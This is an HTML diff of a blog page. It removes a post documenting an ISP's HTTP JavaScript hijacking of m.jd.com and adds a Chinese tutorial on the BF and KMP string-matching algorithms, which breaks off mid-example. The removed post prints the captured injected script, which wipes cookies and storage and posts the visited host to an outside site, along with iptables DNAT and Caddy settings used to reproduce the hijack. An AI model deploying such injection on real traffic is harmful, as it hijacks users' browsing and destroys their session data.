@@ -52,7 +52,7 @@
     
     <title>
         
-            Simple HTTP Hijacking | 
+            KMP 与 BF 字符串模式匹配算法简析 | 
         
         Potato Online
     </title>
@@ -253,7 +253,7 @@
     <!-- WebAPP Icons -->
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="application-name" content="Potato Online">
-    <meta name="msapplication-starturl" content="https://www.kmahyyg.xyz/2018/Simple-HTTP-Hijacking/">
+    <meta name="msapplication-starturl" content="https://www.kmahyyg.xyz/2018/KMP-BF-DataStru/">
     <meta name="msapplication-navbutton-color" content="#0097A7">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-title" content="Potato Online">
@@ -272,15 +272,15 @@
     
 
     <!-- The Open Graph protocol -->
-    <meta property="og:url" content="https://www.kmahyyg.xyz/2018/Simple-HTTP-Hijacking/">
+    <meta property="og:url" content="https://www.kmahyyg.xyz/2018/KMP-BF-DataStru/">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="Simple HTTP Hijacking | Potato Online">
+    <meta property="og:title" content="KMP 与 BF 字符串模式匹配算法简析 | Potato Online">
     <meta property="og:image" content="https://yygc.zzjnyyz.cn/asset_files/avatar-yyg.jpg">
     <meta property="og:description" content="Resources determined everything.">
     <meta property="og:article:tag" content="Tech"> 
 
     
-        <meta property="article:published_time" content="Fri Jun 08 2018 11:01:11 GMT+0000">
+        <meta property="article:published_time" content="Wed Oct 17 2018 13:29:29 GMT+0000">
         <meta property="article:modified_time" content="Wed Oct 17 2018 14:55:31 GMT+0000">
     
 
@@ -289,7 +289,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="https://www.kmahyyg.xyz/2018/Simple-HTTP-Hijacking/index.html" />
+        <link rel="canonical" href="https://www.kmahyyg.xyz/2018/KMP-BF-DataStru/index.html" />
     
 
     <!-- Structured-data for SEO -->
@@ -301,9 +301,9 @@
 {
     "@context": "https://schema.org",
     "@type": "BlogPosting",
-    "mainEntityOfPage": "https://www.kmahyyg.xyz/2018/Simple-HTTP-Hijacking/index.html",
-    "headline": "Simple HTTP Hijacking",
-    "datePublished": "Fri Jun 08 2018 11:01:11 GMT+0000",
+    "mainEntityOfPage": "https://www.kmahyyg.xyz/2018/KMP-BF-DataStru/index.html",
+    "headline": "KMP 与 BF 字符串模式匹配算法简析",
+    "datePublished": "Wed Oct 17 2018 13:29:29 GMT+0000",
     "dateModified": "Wed Oct 17 2018 14:55:31 GMT+0000",
     "author": {
         "@type": "Person",
@@ -397,7 +397,7 @@
     </button>
 
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Preface"><span class="post-toc-number">1.</span> <span class="post-toc-text">Preface</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Deployment"><span class="post-toc-number">2.</span> <span class="post-toc-text">Deployment</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Add-NAT-to-redirect-traffic"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">Add NAT to redirect traffic</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Caddy-for-listening-on-port-80"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">Caddy for listening on port 80</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Done"><span class="post-toc-number">3.</span> <span class="post-toc-text">Done!</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Referrence"><span class="post-toc-number">4.</span> <span class="post-toc-text">Referrence</span></a></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#字符串模式匹配算法"><span class="post-toc-number">1.</span> <span class="post-toc-text">字符串模式匹配算法</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#BF-算法-Brute-Force"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">BF 算法 (Brute Force)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#KMP-算法-Kruth-Morris-Pratt"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">KMP 算法 (Kruth-Morris-Pratt)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#算法示例"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">算法示例</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#失配函数"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">失配函数</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#理清匹配过程"><span class="post-toc-number">1.2.2.1.</span> <span class="post-toc-text">理清匹配过程</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#关于-Next-表的建立"><span class="post-toc-number">1.2.2.2.</span> <span class="post-toc-text">关于 Next 表的建立</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#学习之后实验"><span class="post-toc-number">1.2.3.</span> <span class="post-toc-text">学习之后实验</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#关于逍爷的讲解"><span class="post-toc-number">1.2.4.</span> <span class="post-toc-text">关于逍爷的讲解</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#相关代码"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">相关代码</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#BF"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">BF</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#KMP"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">KMP</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#改进后的-Next-数组的递归生成"><span class="post-toc-number">1.3.3.</span> <span class="post-toc-text">改进后的 Next 数组的递归生成</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#拓展延伸：-Sunday-算法"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">拓展延伸： Sunday 算法</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Boyer-Moore-算法"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">Boyer-Moore 算法</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Sunday-算法"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">Sunday 算法</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#一点点碎碎念"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">一点点碎碎念</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Reference"><span class="post-toc-number">2.</span> <span class="post-toc-text">Reference</span></a></li></ol>
     </ul>
     
 
@@ -429,7 +429,7 @@
         
     
             <p class="article-headline-p">
-                Simple HTTP Hijacking
+                KMP 与 BF 字符串模式匹配算法简析
             </p>
         </div>
 
@@ -448,7 +448,7 @@
     <!-- Author Name & Date -->
     <div>
         <strong>Patrick Young</strong>
-        <span>6月 08, 2018</span>
+        <span>10月 17, 2018</span>
     </div>
 
     <div class="section-spacer"></div>
@@ -470,7 +470,7 @@
 <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
     <li class="mdl-menu__item">在其它设备中阅读本文章</li>
     
-        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACZklEQVR42u3awW6DMBAE0Pz/T7fXSlXIzBoMip5PVRPAj4PtzO7r56vHCw8PDw8PDw8P72G8Vzz+f//vf5K7vfvO//vM5oaHh4e3k/dhqY0x7bXvMLO54eHh4e3n5Uv28bX5VR8mOttO8PDw8B7Ge3uQPVzE26MzHh4e3jfx8iU+eRH5p3h4eHjP5OU/+Ns7HIcOK3fGw8PDu4vXFsB2/n1DfQ8PDw/vkNeOfFlvg4afkwYeHh7e1bykiJU3ByQLel4wy0tieHh4eDt57cPawthsq0hedxRG4OHh4V3Gaxf6fCmfTXS2teDh4eHt4bUhaVusWjmI54EvHh4e3n7e+pbQhgjJKx42E+Dh4eFt4UUl+dEU82N3Tv3wCvDw8PC28FbiiQ/RwCiGWGkvwMPDw7uL1zZC5Yw8nG23BDw8PLw9vFmZP9kMVqKHWfsXHh4e3k7e+gNmJbQ2/ohaWvHw8PC28K4oR62XstrgAw8PD28n76ywNT9GJ0fw/GiOh4eHt5PXhq35SHjJtpHEvnh4eHj7eckSnz8yeX15INLeDQ8PD+9qXh5GtM0Bs/CiaBHIfzHg4eHhXcDLMSsFqjxoaKNePDw8vJ28sx4zaz9t449hjIuHh4d3Kq9edpfDhbzMljci4OHh4e3ktYtyvrjPkO2xGw8PD+8uXrIZtEfwWTNWe+zGw8PDu5e3EuCuxBZnbU54eHh4z+S17a0zZF5mq1NqPDw8vJt4s7aDfOrtffDw8PDu4iVhRBtVrAS7CanYGPDw8PBO5bVBwAkH3zZi2Fnfw8PDwzvkfd/Aw8PDw8PDw8N7wPgFCgwrJlebe6wAAAAASUVORK5CYII=">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACVklEQVR42u3aQXLDIBAEQP3/084DEiszgJDsak4ul2W2dQBqluP11ePAw8PDw8PDw8N7GO+Ix/lTf0wTPPv7+wW14eHh4W3h/bPUBiXmjOT/p2rDw8PD28h7t+CeM86nzF9BMm/0WvHw8PA+hHfOfjdLOy8eHh7e5/KSAGIm4MDDw8P7FF67rCdFt6HGzVkLHh4eXszLi97/eWt/Dw8PDy/g1Vea4pZ/HlIkG0BRIR4eHt7FvHwhzgHJ7+c3Bjw8PLx7eUlQ2/5m/tm8Njw8PLydvPMlOFnKk3+YD3aLJhweHh7exbyxq6ht4z8PjpN58fDw8J7Ma1tibfQw/5v6ThkeHh7eNC+PYpOYdSYgbmvAw8PDu5c3thwvuCAVbEV5tXh4eHh7eDORa7Jt5Af0fPOY6u/h4eHhLeK1zadVQUYeXhTz4uHh4V3Mmy/6FYyocTW0MeDh4eHt541dF8g/53Hw2OzFkRoPDw9vEa/9i5mYNW+AJQExHh4e3l28sbB17MCdbBLtBQU8PDy8p/HyRtdMjJsfsheEEXh4eHgX8Mai1Xyhb19u/iweHh7evby2TdXC2g2gOLjj4eHhbeTNX5Nqo9tVNeDh4eHt5LWjvVraAvKoAg8PD+8u3hGPGeRYyDt4nQsPDw9vC6/dDNrj9dhrao/meHh4ePt5ixfoIJ6YOXAviHHx8PDwtvPaJb49picvBQ8PD++zeMfQSMptNwM8PDy8u3j51ah2q8hfzXkNeHh4eM/hrVrQZ5pbbfvtkv4eHh4eXsD7voGHh4eHh4eHh/eA8QO6eoaSzfhjgAAAAABJRU5ErkJggg==">
     
 </ul>
 
@@ -504,7 +504,7 @@
 
     <!-- Share Twitter -->
     
-        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=Simple HTTP Hijacking&url=https://www.kmahyyg.xyz/2018/Simple-HTTP-Hijacking/index.html&via=Patrick Young" target="_blank">
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=KMP 与 BF 字符串模式匹配算法简析&url=https://www.kmahyyg.xyz/2018/KMP-BF-DataStru/index.html&via=Patrick Young" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Twitter
             </li>
@@ -513,7 +513,7 @@
 
     <!-- Share Facebook -->
     
-        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=https://www.kmahyyg.xyz/2018/Simple-HTTP-Hijacking/index.html" target="_blank">
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=https://www.kmahyyg.xyz/2018/KMP-BF-DataStru/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Facebook
             </li>
@@ -522,7 +522,7 @@
 
     <!-- Share Google+ -->
     
-        <a class="post_share-link" href="https://plus.google.com/share?url=https://www.kmahyyg.xyz/2018/Simple-HTTP-Hijacking/index.html" target="_blank">
+        <a class="post_share-link" href="https://plus.google.com/share?url=https://www.kmahyyg.xyz/2018/KMP-BF-DataStru/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Google+
             </li>
@@ -534,7 +534,7 @@
 
     <!-- Share QQ -->
     
-        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=Potato Online&title=Simple HTTP Hijacking&summary=Resources determined everything.&pics=https://www.kmahyyg.xyzhttps://yygc.zzjnyyz.cn/asset_files/avatar-yyg.jpg&url=https://www.kmahyyg.xyz/2018/Simple-HTTP-Hijacking/index.html" target="_blank">
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=Potato Online&title=KMP 与 BF 字符串模式匹配算法简析&summary=Resources determined everything.&pics=https://www.kmahyyg.xyzhttps://yygc.zzjnyyz.cn/asset_files/avatar-yyg.jpg&url=https://www.kmahyyg.xyz/2018/KMP-BF-DataStru/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 QQ
             </li>
@@ -543,7 +543,7 @@
 
     <!-- Share Telegram -->
     
-        <a class="post_share-link" href="https://telegram.me/share/url?url=https://www.kmahyyg.xyz/2018/Simple-HTTP-Hijacking/index.html&text=Simple HTTP Hijacking" target="_blank">
+        <a class="post_share-link" href="https://telegram.me/share/url?url=https://www.kmahyyg.xyz/2018/KMP-BF-DataStru/index.html&text=KMP 与 BF 字符串模式匹配算法简析" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Telegram
             </li>
@@ -559,36 +559,356 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>As a man heavily relies on network stablity, I connected to Internet via CT Network.</p>
-<p>However, after experiencing the DNS response packet fully-filled with alphabet within two days, I experienced a HTTP JavaScript Hijacking again. This time, they hijacked <code>m.jd.com:80</code> . I reproduced this “feature” using my Arch Linux PC Chrome, iPad Safari, iPad Chrome again and again.</p>
-<p>I will provide my packet capture files here.</p>
-<p>DNS Capture:  <a href="https://yygc.zzjnyyz.cn/asset_files/udp53_filledNONSENSE.pcap" target="_blank" rel="noopener">PCAP File</a></p>
-<p>Hijack Capture: <a href="https://yygc.zzjnyyz.cn/asset_files/jd_hijack_ipad.chls" target="_blank" rel="noopener">CHLS File - Charles Proxy</a></p>
-<p>They still don’t admit it. And they asked me if they could go to my house and check it themselves. I accepted. However, the process of reproduction is tested under a very clear environment. Now, they set up a whitelist and want to cheat me.</p>
-<p>I won’t accept any cheat. Now, I started to deploy a hijack by myself now.</p>
-<h1 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h1><h2 id="Add-NAT-to-redirect-traffic"><a href="#Add-NAT-to-redirect-traffic" class="headerlink" title="Add NAT to redirect traffic"></a>Add NAT to redirect traffic</h2><blockquote>
-<p><code>REDIRECT</code> alters the destination IP address to send to the machine itself. In other words, locally generated packets are mapped to the 127.0.0.1 address. It’s for redirecting local packets. If you only want to redirect the traffic between services on the local machine, it will be a good choice.</p>
-</blockquote>
-<blockquote>
-<p><code>DNAT</code> is actual <a href="http://en.wikipedia.org/wiki/Network_address_translation" target="_blank" rel="noopener">Network Address Translation</a>. If you want packets destinated outside of the local system to have the destination altered, it’s the better choice of the two, as <code>REDIRECT</code> will not work.</p>
-</blockquote>
-<p>iptables Config</p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># sysctl -w net.ipv4.ip_forward=1</span>
-<span class="token comment" spellcheck="true"># iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT</span>
-<span class="token comment" spellcheck="true"># iptables -t nat -A PREROUTING -p tcp -m tcp -s &lt;SOURCE IP> -d &lt;DESTINATION IP> -j DNAT --to-destination &lt;WEB SERVER IP>:&lt;PORT></span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h2 id="Caddy-for-listening-on-port-80"><a href="#Caddy-for-listening-on-port-80" class="headerlink" title="Caddy for listening on port 80"></a>Caddy for listening on port 80</h2><p>Caddy Config</p>
-<pre><code>http://m.jd.com:80 {
-   timeouts none
-   log stdout
-   root /tmp/testweb
-}
-</code></pre><p>/tmp/testweb/index.html (File dumped from pcap file)</p>
-<pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">function</span> <span class="token function">qs</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>m<span class="token punctuation">,</span>v<span class="token punctuation">,</span>u<span class="token punctuation">)</span><span class="token punctuation">{</span>u<span class="token operator">=</span>u<span class="token operator">||</span>D<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">var</span> t<span class="token operator">=</span>u<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'/(\\?|#|&amp;)('</span><span class="token operator">+</span>n<span class="token operator">+</span><span class="token string">')=([^&amp;]*)(&amp;|$)/i'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span>m<span class="token operator">=</span>m<span class="token operator">||</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>v<span class="token operator">=</span>t<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">||</span>v<span class="token punctuation">}</span><span class="token keyword">return</span> m<span class="token operator">&amp;&amp;</span>v<span class="token operator">?</span><span class="token string">'&amp;'</span><span class="token operator">+</span>m<span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>v<span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">fc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> h<span class="token operator">=</span>location<span class="token punctuation">.</span>host<span class="token punctuation">,</span>x<span class="token operator">=</span><span class="token string">'=;expires='</span><span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUTCString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token operator">=</span>x<span class="token operator">+</span><span class="token string">';path='</span><span class="token punctuation">,</span>z<span class="token operator">=</span>y<span class="token operator">+</span><span class="token string">'/;domain='</span><span class="token punctuation">,</span>l<span class="token operator">=</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>y<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">,</span>z<span class="token operator">+</span>h<span class="token punctuation">,</span>z<span class="token operator">+</span>h<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>o<span class="token operator">=</span>D<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/[^ =;]+(?=\=)/g</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>o<span class="token operator">&amp;&amp;</span>S<span class="token punctuation">)</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span>o<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> j<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">;</span><span class="token punctuation">)</span>D<span class="token punctuation">.</span>cookie<span class="token operator">=</span>o<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>l<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>localStorage<span class="token punctuation">)</span>localStorage<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>sessionStorage<span class="token punctuation">)</span>sessionStorage<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span>fc<span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">fip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> u<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'http://m.quanwangfa.com/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(\?|#)&amp;/g</span><span class="token punctuation">,</span><span class="token string">'$1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>D<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>D<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">"javascript:var D=document;D.write(\"&lt;html>&lt;body>&lt;form method='post'action='"</span><span class="token operator">+</span>u<span class="token operator">+</span><span class="token string">"'>&lt;input name='t'value='"</span><span class="token operator">+</span>location<span class="token punctuation">.</span>host<span class="token operator">+</span><span class="token string">"'/>&lt;input name='p'value='0'/>&lt;input name='g'value='_top'/>&lt;input type='submit'id='s'/>&lt;/form>&lt;/body>&lt;/html>\");var s=D.getElementById('s');if (s.click) s.click();D.close()"</span><span class="token punctuation">;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span><span class="token punctuation">{</span>D<span class="token punctuation">.</span>cookie<span class="token operator">=</span><span class="token string">'home=s'</span><span class="token punctuation">;</span>location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">var</span> D<span class="token operator">=</span>document<span class="token punctuation">,</span>d<span class="token operator">=</span>D<span class="token punctuation">,</span>S<span class="token operator">=</span><span class="token operator">!</span>D<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/home=s/i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>D<span class="token punctuation">.</span>body<span class="token punctuation">.</span>style<span class="token punctuation">.</span>visibility<span class="token operator">=</span><span class="token string">'hidden'</span><span class="token punctuation">;</span>D<span class="token punctuation">.</span>oncontextmenu<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token function">fc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fip</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+        <h1 id="字符串模式匹配算法"><a href="#字符串模式匹配算法" class="headerlink" title="字符串模式匹配算法"></a>字符串模式匹配算法</h1><p>这里讨论两种常见的字符串模式匹配算法，不讨论字符串的预处理。</p>
+<p>关于对字符串进行搜索，请参考 <a href="https://zh.m.wikipedia.org/wiki/Boyer-Moore%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95" target="_blank" rel="noopener">Boyer-Moore 字符串搜索算法 (Wikipedia CN)</a></p>
+<p>另外建议大家阅读 [Sunday 算法]</p>
+<h2 id="BF-算法-Brute-Force"><a href="#BF-算法-Brute-Force" class="headerlink" title="BF 算法 (Brute Force)"></a>BF 算法 (Brute Force)</h2><p>返回子串 Ptn 在主串 Tag 的第 pos 个字符后(含第 pos 个位置)第一次出现的位置，若不存在，则返回 -1，这里的位置全部以从 0 开始计算为准，其中 T 非空，0 &lt;= pos &lt;= Tlen。</p>
+<p>使用 i 标记当前在 Tag 中匹配的字符的位置，初始值为 pos。 使用 j 标记 Ptn 中正在等待比较的位置，初始值为 0,下同。</p>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token keyword">const</span> string <span class="token operator">&amp;</span>Tag<span class="token punctuation">,</span><span class="token keyword">const</span> string <span class="token operator">&amp;</span>Ptn<span class="token punctuation">,</span><span class="token keyword">int</span> pos<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="Done"><a href="#Done" class="headerlink" title="Done!"></a>Done!</h1><p>Tested. </p>
-<p>Update: 2 weeks after I report to MIIT, still can be reproduced on my HUAWEI device.</p>
-<h1 id="Referrence"><a href="#Referrence" class="headerlink" title="Referrence"></a>Referrence</h1><p><a href="https://serverfault.com/questions/179200/difference-beetween-dnat-and-redirect-in-iptables" target="_blank" rel="noopener">https://serverfault.com/questions/179200/difference-beetween-dnat-and-redirect-in-iptables</a><br><a href="http://xstarcd.github.io/wiki/Linux/iptables_forward_internetshare.html" target="_blank" rel="noopener">http://xstarcd.github.io/wiki/Linux/iptables_forward_internetshare.html</a><br><a href="https://my.oschina.net/tridays/blog/785483" target="_blank" rel="noopener">https://my.oschina.net/tridays/blog/785483</a></p>
+<p>即对 Tag 的每一个字符与 Ptn 的字符进行逐字比较：</p>
+<ul>
+<li>若完整匹配则返回匹配成功的 pos 值。</li>
+<li>匹配过程中，对当前的 pos 值对应位置之后的每一字符进行 Ptn 的匹配，出现不符合的情况，则将 i 置为 pos + 1，j 置为 0；从当前 pos 值对应的下一个字符开始从头对 Ptn 进行匹配。</li>
+<li>若扫描完整个 Tag 都无法匹配，返回 -1.</li>
+</ul>
+<p>该算法在最坏情况下的时间复杂度为 O(len(P)*len(T))，另外该算法的空间复杂度为 O(1)。</p>
+<h2 id="KMP-算法-Kruth-Morris-Pratt"><a href="#KMP-算法-Kruth-Morris-Pratt" class="headerlink" title="KMP 算法 (Kruth-Morris-Pratt)"></a>KMP 算法 (Kruth-Morris-Pratt)</h2><p>上述算法的时间复杂度为乘积关系，是由于索引指针回溯引起的，针对上述不足，有了 KMP 算法。 KMP 算法的时间复杂度为 O(len(P)+len(T))，空间复杂度为 O(len(P))。这个算法改进的地方在于，不需要过度回溯索引指针 i，而是利用部分匹配结果尽可能的向远滑动，继续进行回溯。</p>
+<h3 id="算法示例"><a href="#算法示例" class="headerlink" title="算法示例"></a>算法示例</h3><p>Step 0: 比较开始。</p>
+<pre><code>     00000000001111111111222
+i:   01234567890123456789012
+Tag: ABC ABCDAB ABCDABCDABDE
+Ptn: ABCDABD
+j:   0123456
+</code></pre><p>Step 1: 从头比较，比较到 Tag[3] = ‘ ‘ 时发现与 Ptn[3] = ‘D’ 不符。我们已知 Tag[1~3] 与 Ptn[0] 不符，接下来略过这些字符，令 i = 4, j = 0</p>
+<pre><code>     00000000001111111111222
+i:   01234567890123456789012
+Tag: ABC ABCDAB ABCDABCDABDE
+Ptn:     ABCDABD
+j:       0123456
+</code></pre><p>Step 2：这时我们继续检索 Tag，发现仍不匹配，但是 Tag[8~9] 对应的 ‘AB’ 出现了两次，故可以作为下次比较的起始点，我们令 i = 8, j = 2，继续比较。</p>
+<pre><code>     00000000001111111111222
+i:   01234567890123456789012
+Tag: ABC ABCDAB ABCDABCDABDE
